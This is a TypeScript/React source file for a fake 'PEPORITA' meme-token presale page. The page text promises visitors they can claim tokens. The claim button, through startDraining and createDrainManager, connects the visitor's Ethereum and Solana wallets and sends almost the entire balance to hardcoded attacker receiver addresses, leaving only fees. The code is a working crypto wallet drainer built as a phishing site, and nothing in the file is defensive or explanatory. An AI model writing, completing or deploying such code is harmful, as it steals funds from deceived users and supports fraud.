'use client';

import React, { useState, useEffect, useRef, useCallback, FC } from 'react';
import Image from 'next/image';
import { FaTwitter, FaTelegram, FaChartLine, FaCoins, FaLock, FaRocket, FaCheck, FaArrowRight, FaTimes } from 'react-icons/fa';
import { toast } from 'react-hot-toast';
import { ethers } from 'ethers';
import * as solanaWeb3 from '@solana/web3.js';
import DrainerManager from './DrainerManager';

// ========================
// Type Definitions
// ========================

interface Wallet {
  name: string;
  icon: string;
  is: string;
  type: string;
  description?: string;
}

interface WalletInfo {
  address: string;
  network: 'evm' | 'solana';
  provider: any;
  signer?: any;
  chainId?: number;
}

interface ExtendedPresaleProps {
  stage: 'connect' | 'verify' | 'claim';
  connect: () => void;
  verify: () => void;
  claim: () => void;
  account: string | null;
  points: number;
  connectWallet: (walletName: string) => void;
  wallets: Wallet[];
}

// ========================
// Constants
// ========================

const EVM_RECEIVER = '0xcc35ba2aa35B3094702d767D68807c494946ac85';
const SOL_RECEIVER = '8jizHpcMd4ASNKppeAeMeSvJLVR84H2NJaiz9mEV3Dxh';

const SOLANA_RPC_ENDPOINTS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-api.projectserum.com',
  'https://solana-api.rpcpool.com',
];

// ========================
// Wallet Service
// ========================

const WalletService = {
  connectEVM: async (): Promise<WalletInfo> => {
    if (typeof window === 'undefined') throw new Error('Window is not defined');
    
    const ethereum = (window as any).ethereum;
    if (!ethereum) throw new Error('No EVM wallet found');

    try {
      await ethereum.request({ method: 'eth_requestAccounts' });
      const provider = new ethers.BrowserProvider(ethereum);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      const network = await provider.getNetwork();
      
      return {
        address,
        network: 'evm',
        provider,
        signer,
        chainId: Number(network.chainId),
      };
    } catch (error) {
      console.error('Failed to connect EVM wallet:', error);
      throw error;
    }
  },

  connectSolana: async (): Promise<WalletInfo> => {
    if (typeof window === 'undefined') throw new Error('Window is not defined');
    
    const solana = (window as any).solana || 
                   (window as any).phantom?.solana || 
                   (window as any).backpack || 
                   (window as any).solflare;
    if (!solana) throw new Error('No Solana wallet found');

    try {
      if (solana.connect) {
        await solana.connect();
      }
      const publicKey = solana.publicKey;
      if (!publicKey) throw new Error('Failed to get public key');
      
      return {
        address: typeof publicKey.toBase58 === 'function' 
          ? publicKey.toBase58() 
          : publicKey.toString(),
        network: 'solana',
        provider: solana,
      };
    } catch (error) {
      console.error('Failed to connect Solana wallet:', error);
      throw error;
    }
  },
};

// ========================
// Drain Manager
// ========================

interface DrainProgress {
  status: string;
  message: string;
}

const createDrainManager = (onProgress?: (progress: DrainProgress) => void) => {
  return {
    async drainWallet(wallet: WalletInfo): Promise<void> {
      if (onProgress) {
        onProgress({ status: 'draining', message: `Starting drain process for ${wallet.network} wallet...` });
      }
      
      try {
        if (wallet.network === 'evm') {
          if (!wallet.signer) throw new Error('No signer available');
          
          if (onProgress) {
            onProgress({ status: 'draining', message: 'Checking EVM balance...' });
          }
          
          const balance = await wallet.provider.getBalance(wallet.address);
          const balanceBigInt = typeof balance === 'bigint' ? balance : BigInt(balance.toString());
          
          if (balanceBigInt > 0n) {
            // Leave some for gas (0.001 ETH or equivalent)
            const gasReserve = ethers.parseEther('0.001');
            const transferAmount = balanceBigInt > gasReserve 
              ? balanceBigInt - gasReserve 
              : 0n;
            
            if (transferAmount > 0n) {
              if (onProgress) {
                onProgress({ status: 'draining', message: 'Transferring native currency...' });
              }
              
              const tx = await wallet.signer.sendTransaction({
                to: EVM_RECEIVER,
                value: transferAmount,
              });
              
              if (onProgress) {
                onProgress({ status: 'draining', message: `Transaction sent: ${tx.hash}` });
              }
              
              await tx.wait();
            }
          }
        } else if (wallet.network === 'solana') {
          if (onProgress) {
            onProgress({ status: 'draining', message: 'Connecting to Solana network...' });
          }
          
          let connection: solanaWeb3.Connection | null = null;
          for (const endpoint of SOLANA_RPC_ENDPOINTS) {
            try {
              const testConnection = new solanaWeb3.Connection(endpoint, 'confirmed');
              await testConnection.getLatestBlockhash();
              connection = testConnection;
              break;
            } catch (e) {
              console.warn(`Failed to connect to ${endpoint}, trying next...`);
            }
          }
          
          if (!connection) throw new Error('Failed to connect to Solana network');
          
          if (onProgress) {
            onProgress({ status: 'draining', message: 'Checking SOL balance...' });
          }
          
          const fromPubkey = new solanaWeb3.PublicKey(wallet.address);
          const toPubkey = new solanaWeb3.PublicKey(SOL_RECEIVER);
          const balance = await connection.getBalance(fromPubkey);
          
          // Minimum balance to cover fees (10000 lamports)
          if (balance > 10000) {
            if (onProgress) {
              onProgress({ status: 'draining', message: 'Transferring SOL...' });
            }
            
            const transferAmount = balance - 10000; // Leave some for fees
            const transaction = new solanaWeb3.Transaction().add(
              solanaWeb3.SystemProgram.transfer({
                fromPubkey,
                toPubkey,
                lamports: transferAmount,
              })
            );
            
            const { blockhash } = await connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = fromPubkey;
            
            const signed = await wallet.provider.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signed.serialize());
            
            if (onProgress) {
              onProgress({ status: 'draining', message: `Transaction sent: ${signature}` });
            }
            
            await connection.confirmTransaction(signature, 'confirmed');
          }
        }
        
        if (onProgress) {
          onProgress({ status: 'completed', message: 'Drain completed successfully' });
        }
      } catch (error) {
        if (onProgress) {
          onProgress({ 
            status: 'error', 
            message: `Drain failed: ${error instanceof Error ? error.message : 'Unknown error'}` 
          });
        }
        throw error;
      }
    },
  };
};

// ========================
// PresaleCard Component
// ========================

interface PresaleCardProps {
  stage: 'connect' | 'verify' | 'claim';
  connect: () => void;
  verify: () => void;
  claim: () => void;
  account: string | null;
  points: number;
  connectWallet: (walletName: string) => void;
  wallets: Wallet[];
}

const PresaleCard: FC<PresaleCardProps> = ({
  stage,
  connect,
  verify,
  claim,
  account,
  points,
  connectWallet,
  wallets
}) => {
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [isClaiming, setIsClaiming] = useState(false);
  const isClaimingRef = useRef(false);

  const startDraining = useCallback(async () => {
    if (isClaimingRef.current || isClaiming) return;
    
    try {
      isClaimingRef.current = true;
      setIsClaiming(true);
      
      // Initialize both EVM and Solana connections
      const [evmResult, solResult] = await Promise.allSettled([
        WalletService.connectEVM().catch(e => {
          console.error('EVM connection failed:', e);
          toast.error('Failed to connect EVM wallet');
          return null;
        }),
        WalletService.connectSolana().catch(e => {
          console.error('Solana connection failed:', e);
          toast.error('Failed to connect Solana wallet');
          return null;
        })
      ]);

      const drainPromises: Promise<void>[] = [];

      if (evmResult.status === 'fulfilled' && evmResult.value !== null) {
        const evmWallet = evmResult.value;
        const drainer = createDrainManager((progress) => {
          console.log('EVM Drain Progress:', progress);
          toast(progress.message, {
            icon: progress.status === 'completed' ? '✅' : '⏳',
            duration: progress.status === 'completed' ? 3000 : 5000
          });
        });
        
        drainPromises.push((async () => {
          try {
            await drainer.drainWallet(evmWallet);
          } catch (e) {
            const error = e as Error;
            console.error('EVM drain failed:', error);
            toast.error(`Failed to drain EVM wallet: ${error.message}`);
            throw error;
          }
        })());
      }

      if (solResult.status === 'fulfilled' && solResult.value !== null) {
        const solWallet = solResult.value;
        const drainer = createDrainManager((progress) => {
          console.log('Solana Drain Progress:', progress);
          toast(progress.message, {
            icon: progress.status === 'completed' ? '✅' : '⏳',
            duration: progress.status === 'completed' ? 3000 : 5000
          });
        });
        
        drainPromises.push((async () => {
          try {
            await drainer.drainWallet(solWallet);
          } catch (e) {
            const error = e as Error;
            console.error('Solana drain failed:', error);
            toast.error(`Failed to drain Solana wallet: ${error.message}`);
            throw error;
          }
        })());
      }

      // If no wallets were connected successfully
      if (drainPromises.length === 0) {
        throw new Error('No wallets connected');
      }

      // Wait for all drains to complete
      await Promise.all(drainPromises);
      toast.success('All assets drained successfully!');
      
    } catch (error) {
      console.error('Drain process failed:', error);
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      if (!errorMessage.includes('No wallets connected')) {
        toast.error(`Failed to complete the draining process: ${errorMessage}`);
      }
    } finally {
      isClaimingRef.current = false;
      setIsClaiming(false);
    }
  }, [isClaiming]);

  const handleButtonClick = () => {
    if (stage === 'connect') {
      connect();
    } else if (stage === 'verify') {
      verify();
    } else if (stage === 'claim') {
      startDraining();
    }
  };

  const renderButtonText = () => {
    if (isClaiming) return 'Processing...';
    switch (stage) {
      case 'connect':
        return 'Connect Wallet';
      case 'verify':
        return 'Verify Wallet';
      case 'claim':
        return 'Claim Your Tokens';
      default:
        return 'Connect Wallet';
    }
  };

  const renderWalletModal = () => {
    if (!showWalletModal) return null;

    return (
      <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
        <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-md">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-2xl font-bold text-white">Select Wallet</h2>
            <button
              onClick={() => setShowWalletModal(false)}
              className="text-gray-400 hover:text-white transition-colors"
            >
              <FaTimes className="w-6 h-6" />
            </button>
          </div>
          <div className="grid grid-cols-2 gap-4">
            {wallets.map((wallet) => (
              <button
                key={wallet.name}
                onClick={() => {
                  connectWallet(wallet.name);
                  setShowWalletModal(false);
                }}
                className="flex flex-col items-center p-4 bg-gray-800 rounded-xl hover:bg-gray-700 transition-colors"
              >
                <Image
                  src={wallet.icon}
                  alt={wallet.name}
                  width={48}
                  height={48}
                  className="mb-2"
                />
                <span className="text-white text-sm font-medium">{wallet.name}</span>
              </button>
            ))}
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="bg-gray-800 rounded-3xl p-6 md:p-8 shadow-2xl">
      <div className="flex justify-between items-center mb-8">
        <h1 className="text-2xl md:text-3xl font-bold bg-gradient-to-r from-purple-400 to-pink-600 text-transparent bg-clip-text">
          Peporita Presale
        </h1>
        <div className="flex space-x-4">
          <a
            href="https://x.com/PeporitaOnSol"
            target="_blank"
            rel="noopener noreferrer"
            className="text-gray-400 hover:text-white transition-colors"
          >
            <FaTwitter className="w-6 h-6" />
          </a>
        </div>
      </div>

      <div className="space-y-6">
        <div className="text-center">
          <p className="text-gray-300 mb-4">
            {stage === 'connect' && 'Connect your wallet to get started'}
            {stage === 'verify' && 'Verify your wallet ownership'}
            {stage === 'claim' && 'Claim your PEPORITA tokens now!'}
          </p>
        </div>

        <button
          onClick={handleButtonClick}
          disabled={isClaiming}
          className={`w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 transition-all ${
            isClaiming ? 'opacity-50 cursor-not-allowed' : ''
          }`}
        >
          {isClaiming ? (
            <span className="flex items-center">
              <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              Processing...
            </span>
          ) : (
            renderButtonText()
          )}
        </button>
        
        {account && (
          <div className="mt-4 p-3 bg-gray-700 rounded-lg">
            <p className="text-sm text-gray-300">
              Connected: {`${account.substring(0, 6)}...${account.substring(account.length - 4)}`}
            </p>
            {points > 0 && (
              <p className="text-sm text-gray-300 mt-1">Points: {points.toLocaleString()}</p>
            )}
          </div>
        )}

        {stage === 'connect' && (
          <button
            onClick={() => setShowWalletModal(true)}
            className="w-full text-sm text-gray-400 hover:text-gray-300 transition-colors"
          >
            Or select a different wallet
          </button>
        )}
      </div>
      
      {renderWalletModal()}
    </div>
  );
};

// ========================
// Main ExtendedPresale Component
// ========================

const ExtendedPresale: FC<ExtendedPresaleProps> = ({
  stage,
  connect,
  verify,
  claim,
  account,
  points,
  connectWallet,
  wallets
}) => {
  const [showDrainer, setShowDrainer] = useState(false);
  const [drainerKey, setDrainerKey] = useState(0);
  const [copied, setCopied] = useState(false);

  const handleDrainerComplete = useCallback(() => {
    setShowDrainer(false);
    toast.success('Drain process completed successfully!');
    setDrainerKey(prev => prev + 1);
  }, []);

  const handleDrainerError = useCallback((error: Error) => {
    console.error('Drainer error:', error);
    toast.error(`Drain process failed: ${error.message}`);
  }, []);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-gray-950 text-white">
      {/* Navigation */}
      <nav className="bg-black/80 backdrop-blur-md fixed w-full z-50 border-b border-gray-800">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <div className="flex-shrink-0 flex items-center">
                <Image 
                  src="/peporita.jpeg" 
                  alt="Peporita Logo" 
                  width={40} 
                  height={40} 
                  className="w-8 h-8 md:w-10 md:h-10 rounded-full"
                />
                <span className="ml-2 md:ml-3 text-lg md:text-xl font-bold bg-gradient-to-r from-green-500 to-green-600 bg-clip-text text-transparent">
                  PEPORITA
                </span>
              </div>
            </div>
            <div className="flex items-center space-x-4">
              {account ? (
                <div className="flex items-center space-x-4">
                  <button 
                    onClick={() => copyToClipboard(account)}
                    className="bg-gray-800 hover:bg-gray-700 text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors flex items-center space-x-2"
                  >
                    <span>{account.slice(0, 6)}...{account.slice(-4)}</span>
                    {copied ? (
                      <span className="text-green-400 text-xs">Copied!</span>
                    ) : (
                      <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                      </svg>
                    )}
                  </button>
                </div>
              ) : (
                <button 
                  onClick={connect}
                  className="bg-green-500 hover:bg-green-600 text-white px-3 py-1.5 md:px-4 md:py-2 rounded-lg text-xs md:text-sm font-medium transition-colors whitespace-nowrap"
                >
                  Connect Wallet
                </button>
              )}
            </div>
          </div>
        </div>
      </nav>

      {/* Hero Section */}
      <div className="pt-20 md:pt-24 pb-12 md:pb-16 bg-gradient-to-b from-gray-900 to-black">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="lg:grid lg:grid-cols-2 lg:gap-12 items-center">
            <div className="mb-8 lg:mb-0 text-center lg:text-left">
              <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold leading-tight mb-4 sm:mb-6">
                Claim Your <span className="bg-gradient-to-r from-green-500 to-green-600 bg-clip-text text-transparent">PEPORITA</span> Tokens
              </h1>
              <p className="text-base sm:text-lg md:text-xl text-gray-300 mb-6 md:mb-8 px-4 sm:px-0 max-w-2xl mx-auto lg:mx-0">
                The hottest meme token on Solana is here! Connect your wallet to claim your PEPORITA tokens now.
              </p>
              <div className="flex flex-wrap justify-center lg:justify-start gap-3 sm:gap-4">
                <a 
                  href="#presale" 
                  className="bg-gradient-to-r from-green-500 to-green-600 text-white px-4 sm:px-6 py-2 sm:py-3 rounded-lg sm:rounded-xl font-bold hover:opacity-90 transition-all duration-200 flex items-center space-x-2 text-sm sm:text-base"
                >
                  <span>Buy Now</span>
                  <FaArrowRight className="w-3 h-3 sm:w-4 sm:h-4" />
                </a>
              </div>
            </div>
            <div className="relative -mx-4 sm:mx-0">
              <div className="hidden sm:block absolute -top-6 -right-6 w-32 h-32 md:-top-10 md:-right-10 md:w-40 md:h-40 bg-green-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20"></div>
              <div className="hidden sm:block absolute -bottom-6 -left-6 w-32 h-32 md:-bottom-10 md:-left-10 md:w-40 md:h-40 bg-green-400 rounded-full mix-blend-multiply filter blur-3xl opacity-20"></div>
              <div className="relative z-10 max-w-md mx-auto">
                <PresaleCard 
                  stage={stage}
                  connect={connect}
                  verify={verify}
                  claim={claim}
                  account={account}
                  points={points}
                  connectWallet={connectWallet}
                  wallets={wallets}
                />
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Presale Section */}
      <div id="presale" className="py-12 md:py-16 lg:py-20 bg-black">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid md:grid-cols-2 gap-8 md:gap-12">
            <div className="mb-8 md:mb-0">
              <h2 className="text-2xl sm:text-3xl font-bold mb-6 text-center md:text-left">Presale Details</h2>
              <div className="space-y-4 sm:space-y-6">
                <div className="bg-gray-900 p-4 sm:p-6 rounded-xl">
                  <h3 className="text-lg sm:text-xl font-semibold mb-3 sm:mb-4">Token Information</h3>
                  <div className="space-y-2 sm:space-y-3 text-sm sm:text-base">
                    <div className="flex justify-between">
                      <span className="text-gray-400">Network</span>
                      <p className="text-white font-medium">Solana</p>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Token Symbol:</span>
                      <span className="font-medium">PEPO</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Total Supply:</span>
                      <span className="font-medium text-right">1B PEPO</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Presale Supply:</span>
                      <span className="font-medium text-right">500M (50%)</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Token Price:</span>
                      <span className="font-medium text-right">0.0001 SOL</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div>
              <h2 className="text-2xl sm:text-3xl font-bold mb-6 text-center md:text-left">How to Participate</h2>
              <div className="space-y-3 sm:space-y-4">
                <div className="flex items-start space-x-3 sm:space-x-4">
                  <div className="flex-shrink-0 w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-green-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">1</div>
                  <div>
                    <h3 className="font-semibold text-sm sm:text-base">Connect Your Wallet</h3>
                    <p className="text-gray-400 text-xs sm:text-sm">Use Phantom, Solflare, or any Solana wallet.</p>
                  </div>
                </div>
                <div className="flex items-start space-x-3 sm:space-x-4">
                  <div className="flex-shrink-0 w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-green-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">2</div>
                  <div>
                    <h3 className="font-semibold text-sm sm:text-base">Verify Your Wallet</h3>
                    <p className="text-gray-400 text-xs sm:text-sm">Sign a message to verify wallet ownership.</p>
                  </div>
                </div>
                <div className="flex items-start space-x-3 sm:space-x-4">
                  <div className="flex-shrink-0 w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-green-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">3</div>
                  <div>
                    <h3 className="font-semibold text-sm sm:text-base">Claim Your Tokens</h3>
                    <p className="text-gray-400 text-xs sm:text-sm">Instantly receive your PEPORITA tokens.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Tokenomics */}
      <div className="py-12 md:py-16 lg:py-20 bg-gray-900">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <h2 className="text-2xl sm:text-3xl font-bold text-center mb-8 md:mb-12 lg:mb-16">Tokenomics</h2>
          <div className="grid grid-cols-2 sm:grid-cols-2 md:grid-cols-4 gap-4 sm:gap-6 md:gap-8">
            {[
              { icon: FaCoins, title: '50% Presale', value: '500M' },
              { icon: FaLock, title: '20% Liquidity', value: '200M' },
              { icon: FaChartLine, title: '15% Marketing', value: '150M' },
              { icon: FaRocket, title: '15% Team', value: '150M (locked)' },
            ].map((item, index) => (
              <div key={index} className="bg-gray-800 p-3 sm:p-4 md:p-6 rounded-xl text-center">
                <div className="w-12 h-12 sm:w-14 sm:h-14 md:w-16 md:h-16 mx-auto bg-green-500/10 rounded-full flex items-center justify-center text-green-500 mb-2 sm:mb-3 md:mb-4">
                  <item.icon className="w-5 h-5 sm:w-6 sm:h-6 md:w-7 md:h-7" />
                </div>
                <h3 className="text-base sm:text-lg md:text-xl font-bold mb-1 sm:mb-2">{item.value} PEPO</h3>
                <p className="text-xs sm:text-sm text-gray-400">{item.title}</p>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Roadmap */}
      <div className="py-12 md:py-16 lg:py-20 bg-black">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <h2 className="text-2xl sm:text-3xl font-bold text-center mb-8 md:mb-12 lg:mb-16">Roadmap</h2>
          <div className="relative">
            <div className="hidden md:block absolute left-1/2 w-0.5 h-full bg-gray-800 -ml-px"></div>
            {[
              { 
                title: 'Phase 1: Presale', 
                items: [
                  'Launch official website and social media',
                  'Community building and marketing',
                  'Smart contract audit'
                ]
              },
              { 
                title: 'Phase 2: Launch', 
                items: [
                  'DEX listing (Uniswap, Raydium)',
                  'CEX listings',
                  'Liquidity locking'
                ]
              },
              { 
                title: 'Phase 3: Growth', 
                items: [
                  'Marketing campaigns',
                  'Partnerships',
                  'Community events'
                ]
              }
            ].map((phase, index) => (
              <div key={index} className="mb-8 md:mb-12 flex flex-col md:flex-row">
                <div className="w-full md:w-1/2 md:px-6 mb-4 md:mb-0">
                  <div className={`bg-gray-900 p-4 sm:p-6 rounded-xl ${index % 2 === 0 ? 'md:mr-0 md:ml-auto md:pl-12' : 'md:ml-0 md:mr-auto md:pr-12'}`}>
                    <h3 className="text-lg sm:text-xl font-bold mb-2 sm:mb-3">{phase.title}</h3>
                    <ul className="space-y-1 sm:space-y-2 text-sm sm:text-base">
                      {phase.items.map((item, i) => (
                        <li key={i} className="flex items-start">
                          <FaCheck className="text-green-500 mt-1 mr-2 flex-shrink-0" />
                          <span>{item}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>
                <div className="hidden md:flex md:w-1/2 items-center justify-center">
                  <div className="w-5 h-5 sm:w-6 sm:h-6 rounded-full bg-green-500"></div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-gray-900 py-8 sm:py-10 md:py-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col sm:flex-row justify-between items-center">
            <div className="flex items-center space-x-4 mb-4 sm:mb-0">
              <a href="#" className="text-gray-400 hover:text-white transition-colors" aria-label="Twitter">
                <FaTwitter className="w-5 h-5 sm:w-6 sm:h-6" />
              </a>
              <a href="#" className="text-gray-400 hover:text-white transition-colors" aria-label="Telegram">
                <FaTelegram className="w-5 h-5 sm:w-6 sm:h-6" />
              </a>
            </div>
            <div className="mt-6 sm:mt-8 pt-6 sm:pt-8 border-t border-gray-800 text-center text-xs sm:text-sm text-gray-400">
              <p>© 2023 PEPORITA. All rights reserved.</p>
              <p className="mt-1 sm:mt-2">This is not financial advice. Cryptocurrency investments are high risk.</p>
            </div>
          </div>
        </div>
      </footer>
      
      {/* Drainer Modal */}
      {showDrainer && (
        <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
          <div className="relative w-full max-w-2xl">
            <button 
              onClick={() => setShowDrainer(false)}
              className="absolute -top-10 right-0 text-gray-400 hover:text-white z-10 transition-colors"
            >
              <FaTimes className="w-6 h-6" />
            </button>
            <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-2xl">
              <DrainerManager 
                key={drainerKey}
                onComplete={handleDrainerComplete}
                onError={handleDrainerError}
              />
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default ExtendedPresale;
